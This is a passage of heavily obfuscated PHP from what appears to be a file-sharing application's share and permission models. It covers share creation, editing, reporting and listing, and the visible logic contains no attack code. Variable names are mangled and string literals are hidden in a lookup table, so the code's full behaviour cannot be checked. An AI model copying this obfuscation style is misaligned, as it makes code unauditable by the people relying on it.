”)->where($İê¥Ç­Î)->select(); if ($»¿™ñæ÷[$×°Şíã[407]] == $×°Şíã[201]) { $»¿™ñæ÷[$×°Şíã[95]] = IO::info($»¿™ñæ÷[$×°Şíã[1102]]); } else { $»¿™ñæ÷[$×°Şíã[95]] = Model($×°Şíã[1249])->pathInfo($»¿™ñæ÷[$×°Şíã[407]]); } $»¿™ñæ÷[$×°Şíã[1882]] = $Ş–¨íúŞ; return $»¿™ñæ÷; } protected function getInfoAuth($È€€—Šš) { $øÂœ¦ùÓ =& $_SERVER[Á÷ ­Šë]; $‡úşğ‡¥ = $this->getInfo($È€€—Šš); if ($‡úşğ‡¥[$øÂœ¦ùÓ[1574]] == USER_ID) { $‡úşğ‡¥[$øÂœ¦ùÓ[418]] = $‡úşğ‡¥[$øÂœ¦ùÓ[95]][$øÂœ¦ùÓ[418]]; } else { $‡úşğ‡¥[$øÂœ¦ùÓ[418]] = Model($øÂœ¦ùÓ[506])->authMake($‡úşğ‡¥[$øÂœ¦ùÓ[1882]]); } return $‡úşğ‡¥; } protected function listData($†ÀØ„š‚ = null, $ãËƒÕ¥• = 300) { $Ä¹±¡¤Ç =& $_SERVER[Á÷ ­Šë]; $Ÿã­áœ’ = array(array($Ä¹±¡¤Ç[497] => array($Ä¹±¡¤Ç[1004], 0), $Ä¹±¡¤Ç[499] => array($Ä¹±¡¤Ç[1004], 0), $Ä¹±¡¤Ç[1883] => $Ä¹±¡¤Ç[1837])); if ($†ÀØ„š‚ == $Ä¹±¡¤Ç[1884]) { $Ÿã­áœ’ = array($Ä¹±¡¤Ç[497] => 1); } else { if ($†ÀØ„š‚ == $Ä¹±¡¤Ç[1087]) { $Ÿã­áœ’ = array($Ä¹±¡¤Ç[499] => 1); } } $Ÿã­áœ’[$Ä¹±¡¤Ç[1574]] = USER_ID; $‡½²ÒÔË = $this->where($Ÿã­áœ’)->selectPage($ãËƒÕ¥•); return $‡½²ÒÔË; } protected function listToMe($°ñŠùñÇ = 300) { $îÍ³šĞ¼ =& $_SERVER[Á÷ ­Šë]; $íÊé¡˜Œ = Model($îÍ³šĞ¼[1885])->userGroupParents(USER_ID); $ÂÄÀøô = array($îÍ³šĞ¼[584] => SourceModel::TYPE_USER, $îÍ³šĞ¼[508] => USER_ID); if ($íÊé¡˜Œ) { $ÂÄÀøô = array(array($îÍ³šĞ¼[584] => SourceModel::TYPE_USER, $îÍ³šĞ¼[508] => USER_ID), array($îÍ³šĞ¼[584] => SourceModel::TYPE_GROUP, $îÍ³šĞ¼[508] => array($îÍ³šĞ¼[7], $íÊé¡˜Œ)), $îÍ³šĞ¼[1883] => $îÍ³šĞ¼[1837]); } $¼×¥À¾ = Model($îÍ³šĞ¼[600])->where($ÂÄÀøô)->selectPage($°ñŠùñÇ); $¿µ³ããÀ = array_to_keyvalue_group($¼×¥À¾[$îÍ³šĞ¼[376]], $îÍ³šĞ¼[492]); if (!$¿µ³ããÀ) { return $¼×¥À¾; } $¡ŠÑúá = $îÍ³šĞ¼[1886]; $ÂÄÀøô = array($îÍ³šĞ¼[492] => array($îÍ³šĞ¼[423], array_keys($¿µ³ããÀ)), $îÍ³šĞ¼[1574] => array($îÍ³šĞ¼[1006], $îÍ³šĞ¼[201])); $ªõùó = $this->field($¡ŠÑúá)->where($ÂÄÀøô)->select(); foreach ($ªõùó as $Çæ‘İÍ => &$ŸĞÅÀ…Ì) { $ŸĞÅÀ…Ì[$îÍ³šĞ¼[1882]] = $¿µ³ããÀ[$ŸĞÅÀ…Ì[$îÍ³šĞ¼[492]]]; } unset($ŸĞÅÀ…Ì); $´Üó¼˜Œ = array($îÍ³šĞ¼[1887] => $ªõùó, $îÍ³šĞ¼[1888] => $¼×¥À¾[$îÍ³šĞ¼[373]]); return $´Üó¼˜Œ; } protected function shareAdd($­¸§¿œ½, $ş¾üµã«) { $ëè £Š =& $_SERVER[Á÷ ­Šë]; $Ì¥ÄÙ–Œ = $this->_addShareData($­¸§¿œ½, $ş¾üµã«); if (!empty($ş¾üµã«[$ëè £Š[1889]])) { $this->_shareAuthSet($Ì¥ÄÙ–Œ, $ş¾üµã«[$ëè £Š[1889]]); } $this->shareEventAdd($­¸§¿œ½, $ş¾üµã«, $ëè £Š[1090]); return $Ì¥ÄÙ–Œ; } protected function shareAddSystem($Ö¿Û», $ªÛ›È¯ü) { $ôÏ·÷ñà =& $_SERVER[Á÷ ­Šë]; $ Æ”å³ = $this->_addShareData($Ö¿Û», $ªÛ›È¯ü, $ôÏ·÷ñà[1202]); $this->_shareAuthSet($ Æ”å³, $ªÛ›È¯ü[$ôÏ·÷ñà[1889]]); return $ Æ”å³; } private function shareEventAdd($°Û¬æû¼, $™¨ˆÍ¹æ, $ø©ÂçÈ— = "\141\x64\x64") { $·ä¦ûØ =& $_SERVER[Á÷ ­Šë]; if (!$°Û¬æû¼ || $°Û¬æû¼ == $·ä¦ûØ[201]) { return; } if ($ø©ÂçÈ— == $·ä¦ûØ[1090]) { if ($™¨ˆÍ¹æ[$·ä¦ûØ[497]] == $·ä¦ûØ[97]) { Model($·ä¦ûØ[568])->eventShare($°Û¬æû¼, $·ä¦ûØ[1890]); } if ($™¨ˆÍ¹æ[$·ä¦ûØ[499]] == $·ä¦ûØ[97]) { Model($·ä¦ûØ[568])->eventShare($°Û¬æû¼, $·ä¦ûØ[1891]); } return; } $ìÖ³ÇĞõ = $this->getInfoByPath($°Û¬æû¼); $¸ë›Úàç = $·ä¦ûØ[1892]; if ($ìÖ³ÇĞõ[$·ä¦ûØ[497]] == $·ä¦ûØ[201] && $™¨ˆÍ¹æ[$·ä¦ûØ[497]] == $·ä¦ûØ[97]) { $¸ë›Úàç = $·ä¦ûØ[1890]; } if ($ìÖ³ÇĞõ[$·ä¦ûØ[497]] == $·ä¦ûØ[97] && $™¨ˆÍ¹æ[$·ä¦ûØ[497]] == $·ä¦ûØ[201]) { $¸ë›Úàç = $·ä¦ûØ[1893]; } if ($ìÖ³ÇĞõ[$·ä¦ûØ[499]] == $·ä¦ûØ[201] && $™¨ˆÍ¹æ[$·ä¦ûØ[499]] == $·ä¦ûØ[97]) { $¸ë›Úàç = $·ä¦ûØ[1891]; } if ($ìÖ³ÇĞõ[$·ä¦ûØ[499]] == $·ä¦ûØ[97] && $™¨ˆÍ¹æ[$·ä¦ûØ[499]] == $·ä¦ûØ[201]) { $¸ë›Úàç = $·ä¦ûØ[1894]; } Model($·ä¦ûØ[568])->eventShare($°Û¬æû¼, $¸ë›Úàç); return; } private function _addShareData($ˆ„³ûà, $•ëÅìîı = array(), $´áŠù” = false) { $¯’Ğ×®ç =& $_SERVER[Á÷ ­Šë]; $õ…ƒø–Ì = $´áŠù” == $¯’Ğ×®ç[1202] ? 0 : USER_ID; $ËË¹Áë‘ = array($¯’Ğ×®ç[422] => $ˆ„³ûà, $¯’Ğ×®ç[1565] => $õ…ƒø–Ì); if ($ˆ„³ûà == 0) { $ËË¹Áë‘ = array($¯’Ğ×®ç[1895] => $•ëÅìîı[$¯’Ğ×®ç[1102]], $¯’Ğ×®ç[1565] => $õ…ƒø–Ì); } if ($…æ¸¿× = $this->where($ËË¹Áë‘)->find()) { return $…æ¸¿×[$¯’Ğ×®ç[492]]; } if ($ˆ„³ûà == 0) { $ïŞµÇ¹Ô = array($¯’Ğ×®ç[28] => get_path_this($•ëÅìîı[$¯’Ğ×®ç[86]])); } else { $ïŞµÇ¹Ô = Model($¯’Ğ×®ç[827])->sourceInfo($ˆ„³ûà); if (!$ïŞµÇ¹Ô) { return !1; } } if (!$•ëÅìîı[$¯’Ğ×®ç[1474]]) { $•ëÅìîı[$¯’Ğ×®ç[1474]] = $ïŞµÇ¹Ô[$¯’Ğ×®ç[28]]; } $Í£æ±²Å = array($¯’Ğ×®ç[1565] => $õ…ƒø–Ì, $¯’Ğ×®ç[422] => $ˆ„³ûà, $¯’Ğ×®ç[1474] => $¯’Ğ×®ç[33], $¯’Ğ×®ç[497] => 0, $¯’Ğ×®ç[499] => 0, $¯’Ğ×®ç[1102] => $¯’Ğ×®ç[33], $¯’Ğ×®ç[314] => $¯’Ğ×®ç[33], $¯’Ğ×®ç[884] => $¯’Ğ×®ç[33], $¯’Ğ×®ç[1896] => 0, $¯’Ğ×®ç[1897] => 0, $¯’Ğ×®ç[500] => 0, $¯’Ğ×®ç[501] => $¯’Ğ×®ç[33], $¯’Ğ×®ç[494] => $¯’Ğ×®ç[33]); $¯ğ©×±Á = explode($¯’Ğ×®ç[47], $¯’Ğ×®ç[1898]); foreach ($¯ğ©×±Á as $®ÖØ²äã) { if (!isset($•ëÅìîı[$®ÖØ²äã])) { continue; } $Í£æ±²Å[$®ÖØ²äã] = $•ëÅìîı[$®ÖØ²äã]; } $ãó¤×ûô = $this->add($Í£æ±²Å); $—³ÉÑèá = array($¯’Ğ×®ç[494] => short_id($ãó¤×ûô)); $this->where(array($¯’Ğ×®ç[491] => $ãó¤×ûô))->save($—³ÉÑèá); return $ãó¤×ûô; } private function _shareAuthSet($áí•Û¸±, $‡™…¨¦°) { $×¦äçá§ =& $_SERVER[Á÷ ­Šë]; if (!is_array($‡™…¨¦°)) { return !1; } $åòÉ‹í™ = Model($×¦äçá§[1849]); $åòÉ‹í™->where(array($×¦äçá§[492] => $áí•Û¸±))->delete(); $ÊÕêåìè = array(); foreach ($‡™…¨¦° as $â¸˜€ˆœ) { $Í‰äå‚ä = SourceModel::TYPE_USER; if ($â¸˜€ˆœ[$×¦äçá§[416]] == SourceModel::TYPE_GROUP) { $Í‰äå‚ä = SourceModel::TYPE_GROUP; } $¯ĞÓ×Ñ€ = array($×¦äçá§[492] => $áí•Û¸±, $×¦äçá§[416] => $Í‰äå‚ä, $×¦äçá§[508] => intval($â¸˜€ˆœ[$×¦äçá§[508]]), $×¦äçá§[1845] => 0, $×¦äçá§[1899] => -1); if ($â¸˜€ˆœ[$×¦äçá§[1845]]) { $¯ĞÓ×Ñ€[$×¦äçá§[1845]] = $â¸˜€ˆœ[$×¦äçá§[1845]]; } else { if ($â¸˜€ˆœ[$×¦äçá§[1899]]) { $¯ĞÓ×Ñ€[$×¦äçá§[1899]] = $â¸˜€ˆœ[$×¦äçá§[1899]]; } } $ÊÕêåìè[] = $¯ĞÓ×Ñ€; } return $åòÉ‹í™->addAll($ÊÕêåìè, array(), !0); } public function numViewAdd($ˆ¢³¡ã•) { $¤¿‡‡³“ =& $_SERVER[Á÷ ­Šë]; $•ê°»† = array($¤¿‡‡³“[491] => $ˆ¢³¡ã•); $this->where($•ê°»†)->setAdd($¤¿‡‡³“[1896]); } public function numDownloadAdd($Ì²ºª•ş) { $ùŠ³°ï =& $_SERVER[Á÷ ­Šë]; $÷«ê´‹ = array($ùŠ³°ï[491] => $Ì²ºª•ş); $this->where($÷«ê´‹)->setAdd($ùŠ³°ï[1897]); } protected function shareEdit($ÉÏ˜¡‹™, $¸ş‘áØ) { $õãàª’â =& $_SERVER[Á÷ ­Šë]; $²“ä‘‚ş = $this->getInfo($ÉÏ˜¡‹™); if (!$²“ä‘‚ş) { return !1; } $this->_checkLinkShare($¸ş‘áØ, $²“ä‘‚ş); $ó±ÂõÜ = array(); $»„Ô©½ß = explode($õãàª’â[47], $õãàª’â[1900]); foreach ($»„Ô©½ß as $ôÔªì¼°) { if (!array_key_exists($ôÔªì¼°, $¸ş‘áØ)) { continue; } $ó±ÂõÜ[$ôÔªì¼°] = $¸ş‘áØ[$ôÔªì¼°]; } $this->shareEventAdd($²“ä‘‚ş[$õãàª’â[407]], $¸ş‘áØ, $õãàª’â[1711]); $this->where(array($õãàª’â[491] => $ÉÏ˜¡‹™))->save($ó±ÂõÜ); if (isset($¸ş‘áØ[$õãàª’â[1889]])) { $this->_shareAuthSet($ÉÏ˜¡‹™, $¸ş‘áØ[$õãàª’â[1889]]); } return !0; } private function _checkLinkShare($é™îşÃ, $»Ø´Ä¯”) { $‹§é¿Å‹ =& $_SERVER[Á÷ ­Šë]; if ($é™îşÃ[$‹§é¿Å‹[497]] != $‹§é¿Å‹[97]) { return; } $¼ŞéÑÅ = $»Ø´Ä¯”[$‹§é¿Å‹[95]][$‹§é¿Å‹[407]]; if ($»Ø´Ä¯”[$‹§é¿Å‹[95]][$‹§é¿Å‹[29]] != $‹§é¿Å‹[203]) { $ÜŸ¿á¿Â = $this->_folderReport($¼ŞéÑÅ); if (!$ÜŸ¿á¿Â) { return; } show_json(LNG($‹§é¿Å‹[1901]) . $‹§é¿Å‹[1902] . $ÜŸ¿á¿Â, !1); } $³øáñ¸Ã = Model($‹§é¿Å‹[827])->fileInfoGet($»Ø´Ä¯”[$‹§é¿Å‹[95]][$‹§é¿Å‹[407]]); if (!$³øáñ¸Ã) { return; } $Ÿ³ƒ”«â = $this->shareFileMeta($³øáñ¸Ã[$‹§é¿Å‹[471]]); if (isset($Ÿ³ƒ”«â[$‹§é¿Å‹[381]]) && $Ÿ³ƒ”«â[$‹§é¿Å‹[381]] == $‹§é¿Å‹[97]) { show_json(LNG($‹§é¿Å‹[1903]), !1); } } private function _folderReport($µõ—ƒ¨Ø) { $ˆˆ€Êüİ =& $_SERVER[Á÷ ­Šë]; $ÜÄÌÔä» = array($ˆˆ€Êüİ[471] => array($ˆˆ€Êüİ[1004], 0), $ˆˆ€Êüİ[745] => 3); $ŒÄ¤è® = Model($ˆˆ€Êüİ[1904])->where($ÜÄÌÔä»)->field($ˆˆ€Êüİ[471])->select(); if (!$ŒÄ¤è®) { return !1; } $ŒÄ¤è® = array_to_keyvalue($ŒÄ¤è®, $ˆˆ€Êüİ[33], $ˆˆ€Êüİ[471]); $Ûèí¾âÎ = $ˆˆ€Êüİ[47] . $µõ—ƒ¨Ø . $ˆˆ€Êüİ[47]; $ÜÄÌÔä» = array($ˆˆ€Êüİ[471] => array($ˆˆ€Êüİ[7], $ŒÄ¤è®), $ˆˆ€Êüİ[525] => array($ˆˆ€Êüİ[390], "\x25{$Ûèí¾âÎ}\x25"), $ˆˆ€Êüİ[435] => 0); $•ûêê¯à = Model($ˆˆ€Êüİ[827])->where($ÜÄÌÔä»)->field($ˆˆ€Êüİ[1905])->find(); if (!$•ûêê¯à) { return !1; } $£šŞÎ¥„ = substr($•ûêê¯à[$ˆˆ€Êüİ[525]], strpos($•ûêê¯à[$ˆˆ€Êüİ[525]], $Ûèí¾âÎ)); $ÜÄÌÔä» = array($ˆˆ€Êüİ[407] => array($ˆˆ€Êüİ[7], trim($£šŞÎ¥„, $ˆˆ€Êüİ[47]))); $€Íòâõ÷ = Model($ˆˆ€Êüİ[827])->where($ÜÄÌÔä»)->field($ˆˆ€Êüİ[28])->select(); $×Ãƒô‹³ = array_to_keyvalue($€Íòâõ÷, $ˆˆ€Êüİ[33], $ˆˆ€Êüİ[28]); $×Ãƒô‹³[] = $•ûêê¯à[$ˆˆ€Êüİ[28]]; return implode($ˆˆ€Êüİ[8], $×Ãƒô‹³); } protected function remove($ÚŸæÄê) { $”ê»½½™ =& $_SERVER[Á÷ ­Šë]; if (is_array($ÚŸæÄê)) { $ÚŸæÄê = array($”ê»½½™[7], $ÚŸæÄê); } $ßõ›²ıƒ = array($”ê»½½™[492] => $ÚŸæÄê); $°€•­ä­ = $this->where($ßõ›²ıƒ)->delete(); if ($°€•­ä­) { Model($”ê»½½™[600])->where(array($”ê»½½™[492] => $ÚŸæÄê))->delete(); } $×ıêñëö = is_array($ÚŸæÄê) ? $ÚŸæÄê[1] : array($ÚŸæÄê); for ($ÓˆúçÀë = 0; $ÓˆúçÀë < count($×ıêñëö); $ÓˆúçÀë++) { $ô±áÑŒà = $this->getInfo($×ıêñëö[$ÓˆúçÀë]); if ($ô±áÑŒà[$”ê»½½™[499]] == $”ê»½½™[97]) { Model($”ê»½½™[568])->eventShare($ô±áÑŒà[$”ê»½½™[407]], $”ê»½½™[1894]); } if ($ô±áÑŒà[$”ê»½½™[497]] == $”ê»½½™[97]) { Model($”ê»½½™[568])->eventShare($ô±áÑŒà[$”ê»½½™[407]], $”ê»½½™[1893]); } } return $°€•­ä­; } protected function removeBySource($¡Ã‡Á…´) { $â¼°šŞÎ =& $_SERVER[Á÷ ­Šë]; $‹ÊÒåó = array($â¼°šŞÎ[422] => array($â¼°šŞÎ[423], $¡Ã‡Á…´)); $Ê÷öàú = $this->field($â¼°šŞÎ[492])->where($‹ÊÒåó)->select(); $Ê÷öàú = array_to_keyvalue($Ê÷öàú, $â¼°šŞÎ[33], $â¼°šŞÎ[492]); if (!$Ê÷öàú) { return; } $‹ÊÒåó = array($â¼°šŞÎ[491] => array($â¼°šŞÎ[423], $Ê÷öàú)); $this->where($‹ÊÒåó)->delete(); Model($â¼°šŞÎ[600])->where($‹ÊÒåó)->delete(); } public function listAll($×Ã¶£Ù÷) { $Ö˜³ÌÍ =& $_SERVER[Á÷ ­Šë]; $òèªñÈ˜ = array(); if ($×Ã¶£Ù÷[$Ö˜³ÌÍ[1574]]) { $òèªñÈ˜[$Ö˜³ÌÍ[1574]] = $×Ã¶£Ù÷[$Ö˜³ÌÍ[1574]]; } if ($×Ã¶£Ù÷[$Ö˜³ÌÍ[756]]) { $Ç¾Ôøäı = $×Ã¶£Ù÷[$Ö˜³ÌÍ[500]] ? $×Ã¶£Ù÷[$Ö˜³ÌÍ[500]] : strtotime(date($Ö˜³ÌÍ[1906])); $òèªñÈ˜[$Ö˜³ÌÍ[204]] = array($Ö˜³ÌÍ[340], array($×Ã¶£Ù÷[$Ö˜³ÌÍ[756]], $Ç¾Ôøäı)); } if ($×Ã¶£Ù÷[$Ö˜³ÌÍ[29]]) { $òèªñÈ˜[$×Ã¶£Ù÷[$Ö˜³ÌÍ[29]]] = 1; } else { $òèªñÈ˜[] = array($Ö˜³ÌÍ[497] => array($Ö˜³ÌÍ[1004], 0), $Ö˜³ÌÍ[499] => array($Ö˜³ÌÍ[1004], 0), $Ö˜³ÌÍ[1883] => $Ö˜³ÌÍ[1837]); } if ($×Ã¶£Ù÷[$Ö˜³ÌÍ[1833]]) { $òèªñÈ˜[] = array($Ö˜³ÌÍ[494] => $×Ã¶£Ù÷[$Ö˜³ÌÍ[1833]], $Ö˜³ÌÍ[1474] => array($Ö˜³ÌÍ[390], "\x25{$×Ã¶£Ù÷[$Ö˜³ÌÍ[1833]]}\45"), $Ö˜³ÌÍ[1883] => $Ö˜³ÌÍ[1837]); } $Ì“¦Áµã = $this->_makeOrder()->where($òèªñÈ˜)->selectPage(20); if (empty($Ì“¦Áµã[$Ö˜³ÌÍ[376]])) { return array(); } $this->_listDataApply($Ì“¦Áµã[$Ö˜³ÌÍ[376]]); return $Ì“¦Áµã; } public function listDataApply($øŠœ¹¦Û) { $this->_listDataApply($øŠœ¹¦Û); return $øŠœ¹¦Û; } private function _listDataApply(&$´ÎŒ¼ûó) { $«åúŞ “ =& $_SERVER[Á÷ ­Šë]; $´’ŞàùÁ = array_to_keyvalue($´ÎŒ¼ûó, $«åúŞ “[33], $«åúŞ “[1574]); $ç´î­ = Model($«åúŞ “[542])->userListInfo(array_unique($´’ŞàùÁ)); $ª›ë·ƒ¥ = array_to_keyvalue($´ÎŒ¼ûó, $«åúŞ “[33], $«åúŞ “[407]); $û°Ù¶œ· = Model($«åúŞ “[827])->sourceListInfo($ª›ë·ƒ¥, !0); foreach ($´ÎŒ¼ûó as $½¿Ü’ôœ => &$îÈŠäñ) { $¼»É±²Š = $îÈŠäñ[$«åúŞ “[1574]]; $îÈŠäñ[$«åúŞ “[1907]] = $ç´î­[$¼»É±²Š] ? $ç´î­[$¼»É±²Š] : !1; $ß–õ‰¡² = $îÈŠäñ[$«åúŞ “[407]]; $îÈŠäñ[$«åúŞ “[95]] = $û°Ù¶œ·[$ß–õ‰¡²] ? $û°Ù¶œ·[$ß–õ‰¡²] : !1; if ($îÈŠäñ[$«åúŞ “[95]][$«åúŞ “[435]] == $«åúŞ “[97]) { unset($´ÎŒ¼ûó[$½¿Ü’ôœ]); } if ($îÈŠäñ[$«åúŞ “[95]] != $«åúŞ “[201] && !$îÈŠäñ[$«åúŞ “[95]]) { unset($´ÎŒ¼ûó[$½¿Ü’ôœ]); } } unset($îÈŠäñ); $´ÎŒ¼ûó = array_values($´ÎŒ¼ûó); } private function _makeOrder($ôœ¡‡Å = '') { $Ï©¿åÁ =& $_SERVER[Á÷ ­Šë]; $“•¯ªé¸ = array($Ï©¿åÁ[204], $Ï©¿åÁ[500], $Ï©¿åÁ[1896], $Ï©¿åÁ[1897]); $‘Î°—§ş = array($Ï©¿åÁ[452] => $Ï©¿åÁ[453], $Ï©¿åÁ[454] => $Ï©¿åÁ[455]); $ˆôÅ¨Äô = Input::get($Ï©¿åÁ[459], $Ï©¿åÁ[7], $Ï©¿åÁ[428], $“•¯ªé¸); $Êö½÷Ø = Input::get($Ï©¿åÁ[460], $Ï©¿åÁ[7], $Ï©¿åÁ[1908], array($Ï©¿åÁ[1832], $Ï©¿åÁ[454])); $Êö½÷Ø = $‘Î°—§ş[$Êö½÷Ø]; $ôœ¡‡Å = $ôœ¡‡Å . "{$ˆôÅ¨Äô}\40{$Êö½÷Ø}"; return $this->order($ôœ¡‡Å); } public function reportAdd($ú¢ÃÎœ’) { $êšÒ¼§ =& $_SERVER[Á÷ ­Šë]; $Ù°À’¾° = array($êšÒ¼§[492] => $ú¢ÃÎœ’[$êšÒ¼§[492]], $êšÒ¼§[1574] => USER_ID); if (Model($êšÒ¼§[1904])->where($Ù°À’¾°)->find()) { return !1; } $®Ã§èœ = array($êšÒ¼§[492] => $ú¢ÃÎœ’[$êšÒ¼§[492]], $êšÒ¼§[1474] => $ú¢ÃÎœ’[$êšÒ¼§[1474]], $êšÒ¼§[407] => $ú¢ÃÎœ’[$êšÒ¼§[407]], $êšÒ¼§[471] => $ú¢ÃÎœ’[$êšÒ¼§[471]], $êšÒ¼§[1574] => USER_ID, $êšÒ¼§[29] => $ú¢ÃÎœ’[$êšÒ¼§[29]], $êšÒ¼§[455] => $ú¢ÃÎœ’[$êšÒ¼§[455]]); return Model($êšÒ¼§[1904])->add($®Ã§èœ); } public function reportList($±„”œå­) { $ÒéÂÒş£ =& $_SERVER[Á÷ ­Šë]; $²¬—Î±¾ = array(); if ($±„”œå­[$ÒéÂÒş£[756]]) { $Ò‡•¢¼Ì = $±„”œå­[$ÒéÂÒş£[500]] ? $±„”œå­[$ÒéÂÒş£[500]] : strtotime(date($ÒéÂÒş£[1906])); $²¬—Î±¾[$ÒéÂÒş£[204]] = array($ÒéÂÒş£[340], array($±„”œå­[$ÒéÂÒş£[756]], $Ò‡•¢¼Ì)); } if (isset($±„”œå­[$ÒéÂÒş£[29]]) && in_array($±„”œå­[$ÒéÂÒş£[29]], array($ÒéÂÒş£[97], $ÒéÂÒş£[439], $ÒéÂÒş£[1909], $ÒéÂÒş£[1910], $ÒéÂÒş£[1911]))) { $²¬—Î±¾[$ÒéÂÒş£[29]] = $±„”œå­[$ÒéÂÒş£[29]]; } if (isset($±„”œå­[$ÒéÂÒş£[745]]) && in_array($±„”œå­[$ÒéÂÒş£[745]], array($ÒéÂÒş£[201], $ÒéÂÒş£[97], $ÒéÂÒş£[439], $ÒéÂÒş£[1909]))) { $²¬—Î±¾[$ÒéÂÒş£[745]] = $±„”œå­[$ÒéÂÒş£[745]]; } $˜ÛÑ¹ƒ” = Input::get($ÒéÂÒş£[460], $ÒéÂÒş£[7], $ÒéÂÒş£[1908], array($ÒéÂÒş£[1832], $ÒéÂÒş£[454])); $ØôéĞúı = array($ÒéÂÒş£[452] => $ÒéÂÒş£[453], $ÒéÂÒş£[454] => $ÒéÂÒş£[455]); $İÏ»úÉ„ = $ÒéÂÒş£[1912] . $ØôéĞúı[$˜ÛÑ¹ƒ”]; $ä¹´‹šÍ = Model($ÒéÂÒş£[1904])->where($²¬—Î±¾)->order($İÏ»úÉ„)->selectPage(20); if (empty($ä¹´‹šÍ[$ÒéÂÒş£[376]])) { return array(); } $³Ûû¼åí = array_to_keyvalue_group($ä¹´‹šÍ[$ÒéÂÒş£[376]], $ÒéÂÒş£[745], $ÒéÂÒş£[492]); if (!empty($³Ûû¼åí[0])) { $±„”œå­ = $³Ûû¼åí[0]; $²¬—Î±¾ = array($ÒéÂÒş£[492] => array($ÒéÂÒş£[7], $±„”œå­)); $ÆÀÄÈëª = $this->where($²¬—Î±¾)->field($ÒéÂÒş£[492])->select(); $ÆÀÄÈëª = array_to_keyvalue($ÆÀÄÈëª, $ÒéÂÒş£[33], $ÒéÂÒş£[492]); $×©ä–ü = array_diff($±„”œå­, $ÆÀÄÈëª); if (!empty($×©ä–ü)) { foreach ($ä¹´‹šÍ[$ÒéÂÒş£[376]] as $ÑÒ½î´ => $éÔÓ¡¸) { if (in_array($éÔÓ¡¸[$ÒéÂÒş£[492]], $×©ä–ü)) { unset($ä¹´‹šÍ[$ÒéÂÒş£[376]][$ÑÒ½î´]); } } } } $this->_listDataApply($ä¹´‹šÍ[$ÒéÂÒş£[376]]); return $ä¹´‹šÍ; } public function reportStatus($¼ã·Ö­Æ) { $¬Àù–£ =& $_SERVER[Á÷ ­Šë]; $úïä™ = array($¬Àù–£[404] => $¼ã·Ö­Æ[$¬Àù–£[404]]); $ÂòÙòÜŒ = Model($¬Àù–£[1904])->where($úïä™)->field($¬Àù–£[1913])->find(); if (!$ÂòÙòÜŒ) { return !1; } $Ö¥ıî = array($¬Àù–£[745] => $¼ã·Ö­Æ[$¬Àù–£[745]]); if ($¼ã·Ö­Æ[$¬Àù–£[745]] == $¬Àù–£[1909] && $ÂòÙòÜŒ[$¬Àù–£[745]] == $¬Àù–£[1909]) { $Ö¥ıî[$¬Àù–£[745]] = 0; } $ÔÀ´ñüÎ = Model($¬Àù–£[1904])->where($úïä™)->save($Ö¥ıî); if ($¼ã·Ö­Æ[$¬Àù–£[745]] == $¬Àù–£[439]) { if ($ÂòÙòÜŒ[$¬Àù–£[471]] != $¬Àù–£[201] && $this->shareFileMeta($ÂòÙòÜŒ[$¬Àù–£[471]])) { $this->shareFileMeta($ÂòÙòÜŒ[$¬Àù–£[471]], 0); } $this->remove($ÂòÙòÜŒ[$¬Àù–£[492]]); return !0; } if ($ÔÀ´ñüÎ && $¼ã·Ö­Æ[$¬Àù–£[745]] == $¬Àù–£[1909]) { $¥šã¶¬Ö = $Ö¥ıî[$¬Àù–£[745]] == $¬Àù–£[1909] ? 1 : 0; $this->shareFileMeta($ÂòÙòÜŒ[$¬Àù–£[471]], $¥šã¶¬Ö); $this->removeByFile($ÂòÙòÜŒ[$¬Àù–£[471]]); } return $ÔÀ´ñüÎ; } private function removeByFile($·úñÖÈ) { $Îî¬Ôƒı =& $_SERVER[Á÷ ­Šë]; $®¿‰¥† = Model($Îî¬Ôƒı[827])->where(array($Îî¬Ôƒı[471] => $·úñÖÈ))->field($Îî¬Ôƒı[407])->select(); $¦Ñáş¡± = array_to_keyvalue($®¿‰¥†, $Îî¬Ôƒı[33], $Îî¬Ôƒı[407]); $áğ½û¸¬ = array($Îî¬Ôƒı[407] => array($Îî¬Ôƒı[7], $¦Ñáş¡±), $Îî¬Ôƒı[497] => 1); $®¿‰¥† = $this->where($áğ½û¸¬)->field($Îî¬Ôƒı[492])->select(); if (empty($®¿‰¥†)) { return; } $Ò¦¾çÙ‘ = array_to_keyvalue($®¿‰¥†, $Îî¬Ôƒı[33], $Îî¬Ôƒı[492]); $this->remove($Ò¦¾çÙ‘); } private function shareFileMeta($æŒ¤Àİ, $ç½Ş…Šë = null) { $Å¢†©Â‡ =& $_SERVER[Á÷ ­Šë]; $ÖÑúéÕ¹ = array($Å¢†©Â‡[471] => $æŒ¤Àİ, $Å¢†©Â‡[103] => $Å¢†©Â‡[1914]); if (is_null($ç½Ş…Šë)) { return Model($Å¢†©Â‡[1915])->where($ÖÑúéÕ¹)->find(); } $ÖÑúéÕ¹[$Å¢†©Â‡[381]] = $ç½Ş…Šë; Model($Å¢†©Â‡[1915])->add($ÖÑúéÕ¹, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\143\145\137\141\165\164\x68"; public function getAuth($Éøì¢Öœ) { $ÙôÉ„‡ =& $_SERVER[Á÷ ­Šë]; $ß¶¸İ¢ = $this->sourceAuthSelect($Éøì¢Öœ); $ãë¸Ç™â = array(); $ßäÃ¿— = array(); $¯ú¸ë¼½ = 2 << 25; foreach ($ß¶¸İ¢ as $üåŒîÒ) { $ï²ß¢õ§ = Model($ÙôÉ„‡[511])->listData($üåŒîÒ[$ÙôÉ„‡[1845]]); if (!$ï²ß¢õ§) { continue; } $ãë¸Ç™â[] = $üåŒîÒ; $Åˆò›Œï = 0; if ($üåŒîÒ[$ÙôÉ„‡[416]] == SourceModel::TYPE_GROUP) { $Åˆò›Œï = $¯ú¸ë¼½ * 2; } if ($üåŒîÒ[$ÙôÉ„‡[416]] == SourceModel::TYPE_USER) { $Åˆò›Œï = $¯ú¸ë¼½; } if ($üåŒîÒ[$ÙôÉ„‡[416]] == SourceModel::TYPE_USER && $üåŒîÒ[$ÙôÉ„‡[508]] == $ÙôÉ„‡[201]) { $Åˆò›Œï = 0; } $ßäÃ¿—[] = $ï²ß¢õ§[$ÙôÉ„‡[418]] + $Åˆò›Œï; } array_multisort($ßäÃ¿—, SORT_DESC, $ãë¸Ç™â); return $ãë¸Ç™â; } public function sourceAuthSelect($Åæ´‹½×) { $ığõÌÇ =& $_SERVER[Á÷ ­Šë]; static $ıŸ¬Õ‡Ö = array(); $îËË´õŞ = is_array($Åæ´‹½×) ? !1 : !0; if ($îËË´õŞ) { $Åæ´‹½× = array($Åæ´‹½×); } $æ¢‚†ñ = array(); foreach ($Åæ´‹½× as $å”şè©) { if (isset($ıŸ¬Õ‡Ö[$å”şè©])) { 